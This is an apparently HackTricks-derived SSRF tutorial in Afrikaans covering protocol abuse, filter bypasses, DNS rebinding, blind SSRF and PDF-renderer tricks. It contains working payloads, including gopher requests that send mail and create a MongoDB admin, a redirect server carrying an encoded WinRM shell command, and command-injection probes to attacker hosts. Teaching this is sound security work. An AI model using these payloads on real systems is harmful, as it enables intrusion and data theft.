# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

'n **Server-side Request Forgery (SSRF)** kwesbaarheid vind plaas wanneer 'n aanvaller 'n **server-side toepassing** manipuleer om **HTTP requests** na 'n domein van hul keuse te maak. Hierdie kwesbaarheid stel die bediener bloot aan ewekansige eksterne versoeke wat deur die aanvaller gerig word.

## Vang SSRF

Die eerste ding wat jy moet doen, is om 'n SSRF-interaksie wat deur jou gegenereer is, vas te vang. Om 'n HTTP- of DNS-interaksie vas te vang kan jy gereedskap soos die volgende gebruik:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Witlysdomeine omseiling

Gewoonlik sal jy vind dat die SSRF slegs werk op sekere witlysdomeine of URL'e. In die volgende bladsy is 'n samevatting van tegnieke om daardie witlys te probeer omseil:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Omseiling via open redirect

Indien die bediener korrek beskerm is, kan jy alle beperkings omseil deur 'n Open Redirect binne die webblad uit te buit. Omdat die webblad SSRF na dieselfde domein sal toelaat en waarskynlik redirects sal volg, kan jy die Open Redirect uitbuit om die bediener toegang tot enige interne hulpbron te laat kry.\
Lees meer hier: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokolle

- **file://**
- Die URL-skema `file://` word verwys en wys direk na `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Die DICT URL-skema word beskryf as gebruik vir toegang tot definisies of woordlyste via die DICT-protokol. 'n Gegewe voorbeeld illustreer 'n opgeboude URL wat 'n spesifieke woord, databasis en inskrywingnommer teiken, asook 'n geval van 'n PHP-skrip wat moontlik misbruik word om met 'n DICT-bediener te koppel met aanvaller-verskafde geloofsbriewe: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Genoem as 'n protokol vir veilige lêeroorplasing oor secure shell (SSH), 'n voorbeeld wys hoe 'n PHP-skrip uitgebruik kan word om aan 'n kwaadwillige SFTP-bediener te koppel: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, wat oor UDP werk, word genoem met 'n voorbeeld van 'n PHP-skrip wat 'n versoek na 'n TFTP-bediener stuur. 'n TFTP-versoek word gemaak na 'generic.com' op poort '12346' vir die lêer 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Hierdie afdelingsgedeelte behandel die Lightweight Directory Access Protocol en beklemtoon die gebruik daarvan vir bestuur en toegang tot verspreide gidsinligtingsdienste oor IP-netwerke. Interakteer met 'n LDAP-bediener op localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- 'n Metode word beskryf om SSRF-kwesbaarhede te benut om met SMTP-dienste op localhost te kommunikeer, insluitend stappe om interne domeinnaam te openbaar en verdere ondersoekstappe gebaseer op daardie inligting.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- As die SSRF deur **curl** uitgevoer word, het curl 'n funksie genaamd [**URL globbing**](https://everything.curl.dev/cmdline/globbing) wat nuttig kan wees om WAFs te omseil. Byvoorbeeld, in hierdie [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) vind jy hierdie voorbeeld vir 'n **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Die Gopher-protokol se vermoë om IP, port en bytes te spesifiseer vir kommunikasie met die bediener word bespreek, saam met gereedskap soos Gopherus en remote-method-guesser om payloads te skep. Twee verskillende gebruike word geïllustreer:

### Gopher://

Deur hierdie protokol te gebruik kan jy die **IP, port and bytes** spesifiseer wat jy wil hê die bediener moet **send**. Dan kan jy basies 'n SSRF uitbuit om te **kommunikeer met enige TCP server** (maar jy moet eers weet hoe om met die diens te praat).\  
Gelukkig kan jy [Gopherus](https://github.com/tarunkant/Gopherus) gebruik om payloads vir verskeie dienste te skep. Daarbenewens kan [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) gebruik word om _gopher_ payloads vir _Java RMI_ dienste te skep.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect na 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Skep gebruiker met username=admin met password=admin123 en met permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Ander

Analytics-software op bedieners log dikwels die Referrer header om inkomende skakels te spoor, 'n praktyk wat toepassings onbedoeld blootstel aan Server-Side Request Forgery (SSRF)-kwesbaarhede. Dit is omdat sodanige sagteware eksterne URLs wat in die Referrer header genoem word, kan besoek om die inhoud van verwysende werwe te analiseer. Om hierdie kwesbaarhede te ontdek, word die Burp Suite-plugin "**Collaborator Everywhere**" aanbeveel, wat gebruik maak van die manier waarop analytics-instrumente die Referer header verwerk om potensiële SSRF-aanvaloppervlakke te identifiseer.

## SSRF via SNI data from certificate

'n Misconfigurasie wat die verbinding met enige backend deur 'n eenvoudige opstelling moontlik kan maak, word geïllustreer met 'n voorbeeld Nginx-konfigurasie:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In hierdie konfigurasie word die waarde van die Server Name Indication (SNI)-veld direk as die backend se adres gebruik. Hierdie opstelling stel 'n kwesbaarheid vir Server-Side Request Forgery (SSRF) bloot, wat misbruik kan word deur eenvoudig die gewenste IP-adres of domeinnaam in die SNI-veld te spesifiseer. 'n Uitbuitingvoorbeeld om 'n verbinding na 'n ewekansige backend af te dwing, soos `internal.host.com`, deur die `openssl`-opdrag te gebruik, word hieronder gegee:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF deur TLS AIA CA Issuers (Java mTLS)

Sommige TLS-stakke sal ontbrekende tussentydse CAs outomaties aflaai deur die **Authority Information Access (AIA) → CA Issuers** URI in die peer-sertifikaat. In **Java**, deur `-Dcom.sun.security.enableAIAcaIssuers=true` te aktiveer terwyl 'n mTLS-diens loop, laat die bediener toe om aanvallers-beheerde URI's uit die kliëntsertifikaat **tijdens die handshake** te dereferensieer, voordat enige HTTP-logika uitgevoer word.

- **Requirements**: mTLS geaktiveer, Java AIA-ophaal geaktiveer, aanvaller kan 'n kliëntsertifikaat aanbied met 'n gemaakte AIA CA Issuers URI.
- **Uitlok van SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Die Java certpath debug-uitsette wys `CertStore URI:http://localhost:8080`, en `nc` vang die HTTP-versoek op met die beheerbare `User-Agent` van `-Dhttp.agent`, wat SSRF tydens sertifikaatvalidasie bewys.
- **DoS via file://**: deur AIA CA Issuers op `file:///dev/urandom` te stel op Unix-agtige gasheerhuise laat Java dit as 'n CertStore hanteer en onbegrensde lukrake bytes lees, wat 'n CPU-kern besig hou en daaropvolgende verbindings blokkeer selfs nadat die kliënt ontkoppel het.

## SSRF via CSS Pre-Processors

LESS is 'n gewilde CSS pre-processor wat veranderlikes, mixins, funksies en die kragtige `@import` directive byvoeg. Tydens kompilasie sal die LESS-engine die hulpbronne wat in `@import`-uitsprake verwys word, **ophaal** en hul inhoud inlyf ("inline") in die resulterende CSS insluit as die `(inline)`-opsie gebruik word.

Kyk hoe om dit uit te buit in:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF met Command Injection

Dit kan die moeite werd wees om 'n payload soos die volgende te probeer: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF-rendering

As die webblad outomaties 'n PDF skep met inligting wat jy verskaf het, kan jy **JS invoeg wat deur die PDF-creator self (die bediener) uitgevoer sal word** terwyl die PDF geskep word, en jy sal 'n SSRF kan misbruik. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Van SSRF na DoS

Skep verskeie sessies en probeer om swaar lêers af te laai deur die SSRF vanuit daardie sessies te misbruik.

## SSRF PHP Functions

Kyk na die volgende bladsy vir kwesbare PHP en selfs Wordpress funksies:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Omleiding na Gopher

Vir sekere eksploitasies mag jy 'n **redirect response** moet stuur (byvoorbeeld om 'n ander protokol soos gopher te gebruik). Hieronder is verskillende python-kodes om met 'n redirect te reageer:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Verkeerd gekonfigureerde proxies vir SSRF

Truuks [**van hierdie pos**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Kwetsbare Flask proxy-kode</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask laat toe om **`@`** as aanvanklike karakter te gebruik, wat dit moontlik maak om die **initial host name the username** te maak en 'n nuwe een te inject. Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Kwetsbare kode:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Daar is ontdek dat dit moontlik is om **die pad van 'n versoek te begin** met die karakter **`;`**, wat dan toelaat om **`@`** te gebruik en 'n nuwe host in te voeg om toegang te kry. Aanvalversoek:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Kwetsbare PHP-kode</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP laat die gebruik toe van die **karakter `*` voor 'n skuinsstreep in die pad** van die URL, maar dit het ander beperkings: dit kan slegs vir die wortelpadnaam `/` gebruik word en punte `.` word nie voor die eerste skuinsstreep toegelaat nie, dus is dit nodig om byvoorbeeld 'n dotless-hex encoded IP address te gebruik:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP omseiling

As jy **probleme** het om **exfiltrate content from a local IP** weens **CORS/SOP**, **DNS Rebidding** kan gebruik word om daardie beperking te omseil:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Outomatiese DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) is 'n tool om [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks uit te voer. Dit bevat die nodige komponente om die IP address van die attack server DNS name te rebind na die target machine se IP address en om attack payloads te bedien om vulnerable software op die doelmasjien te exploit.

Kyk ook na die **publieke server by** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Vereistes:

- **SSRF**
- **Outbound TLS sessions**
- Dienste op plaaslike poorte

Aanval:

1. Vra die gebruiker/bot om **access** tot 'n **domain** wat deur die **attacker** beheer word.
2. Die **TTL** van die **DNS** is **0** sek (sodat die slagoffer binnekort weer die IP van die domain sal nagaan).
3. 'n **TLS connection** word geskep tussen die slagoffer en die domain van die attacker. Die attacker plaas die **payload inside** die **Session ID or Session Ticket**.
4. Die **domain** sal 'n **infinite loop** van redirects teen **himself** begin. Die doel hiervan is om die gebruiker/bot die domain te laat access totdat dit **again** 'n **DNS request** van die domain uitvoer.
5. In die **DNS request** word nou 'n **private IP** adres gegee (127.0.0.1 byvoorbeeld).
6. Die gebruiker/bot sal probeer om die **reestablish the TLS connection** en daartoe sal dit die **Session** ID/Ticket ID **send** (waarin die **payload** van die attacker vervat was). Gefeliciteer — jy het daarin geslaag om die **user/bot attack himself**.

Let wel dat gedurende hierdie aanval, as jy localhost:11211 (_memcache_) wil attack, moet jy die slagoffer die aanvanklike verbinding laat vestig met www.attacker.com:11211 (die **port must always be the same**).\
**Om hierdie aanval uit te voer kan jy die tool gebruik**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Vir **meer inligting** kyk na die praatjie waar hierdie aanval verduidelik word: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Die verskil tussen 'n blind SSRF en 'n nie-blind een is dat jy by 'n blind nie die response van die SSRF request kan sien nie. Dit maak dit meer moeilik om te exploit omdat jy slegs well-known vulnerabilities sal kan misbruik.

### Tydgebaseerde SSRF

**Checking the time** van die responses vanaf die bediener kan dit **moontlik maak om te weet of 'n hulpbron bestaan of nie** (miskien neem dit meer tyd om 'n bestaande hulpbron te access as om een te access wat nie bestaan nie)

### Van blind na volle misbruik van statuskodes

Volgens hierdie [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), kan sommige blind SSRF gebeur omdat selfs al antwoord die teiken-URL met 'n 200 status code (soos AWS metadata), hierdie data nie behoorlik geformateer is nie en daarom mag die app weier om dit te wys.

Daar is egter gevind dat deur sekere redirect-antwoorde (statuskodes 305 tot 309) via die SSRF te stuur, dit moontlik is om die toepassing hierdie redirects te laat volg terwyl dit in 'n foutmodus inkom, wat nie meer die formaat van die data sal nagaan nie en dit net kan uitdruk.

Die python-server wat gebruik word om dit te exploit is die volgende:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Stappe:**
- Eerstens laat 302 die app begin volg.
- Dan ontvang dit 305 → 306 → 307 → 308 → 309 → 310.
- Na die 5de vreemde kode gee die PoC uiteindelik 302 → 169.254.169.254 → 200 OK terug.

**Wat binne die teiken gebeur:**
- libcurl self volg eintlik 305–310; dit normaliseer net onbekende kodes na “volg.”
- Na N vreemde omleidings (≥ 5 hier) besluit die toepassing se eie wrapper “iets is fout” en skakel oor na 'n foutmodus bedoel vir debugging.
- In daardie modus gee dit die volledige omleidingsketting plus die finale body terug aan die eksterne caller.
- Resultaat: attacker sien elke header + die metadata JSON, missie voltooi.

Let daarop dat dit interessant is om statuskodes te leak wat jy voorheen nie kon leak nie (soos 'n 200). As jy egter op een of ander manier ook die statuskode van die response kan kies (stel jou voor jy kan besluit dat die AWS metadata met 'n 500 statuskode reageer), **kan daar dalk sommige statuskodes wees wat die inhoud van die response direk leak.**

### HTML-to-PDF renderers as blind SSRF gadgets

Biblioteke soos **TCPDF** (en wrappers soos **spipu/html2pdf**) sal outomaties enige URLs wat in attacker-controlled HTML voorkom haal terwyl hulle 'n PDF render. Elke `<img>` of `<link rel="stylesheet">` attribuut word server-side opgelos via cURL, `getimagesize()`, of `file_get_contents()`, sodat jy die PDF worker kan dwing om interne hosts te probeer, selfs al word geen HTTP response aan jou weerspieël nie.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 issues several retrieval attempts for each `<img>` resource, so a single payload can generate multiple requests (helpful for timing-based port scans).
- html2pdf copies TCPDF’s behaviour for `<img>` and adds CSS fetching inside `Css::extractStyle()`, which simply calls `file_get_contents($href)` after a shallow scheme check. Abuse it to hit loopback services, RFC1918 ranges, or cloud metadata endpoints.
- Combine this SSRF primitive with the [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) to leak both internal HTTP responses and local files rendered into the PDF.

Beveiligers moet eksterne URL's verwyder voordat daar gerender word of die renderer in 'n netwerk-sandbox isoleer; totdat dit gebeur, behandel PDF-generators as blind SSRF-proxies.

## Cloud SSRF Exploitation

As jy 'n SSRF-kwetsbaarheid in 'n masjien vind wat in 'n cloud-omgewing loop, kan jy dalk interessante inligting oor die cloud-omgewing en selfs credentials bekom:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF-kwesbare platforme

Verskeie bekende platforme bevat of het SSRF-kwetsbaarhede gehad; kyk na hulle in:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Gereedskap

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Gereedskap om SSRF-kwetsbaarhede te ontdek en te exploit

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Hierdie instrument genereer Gopher payloads vir:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

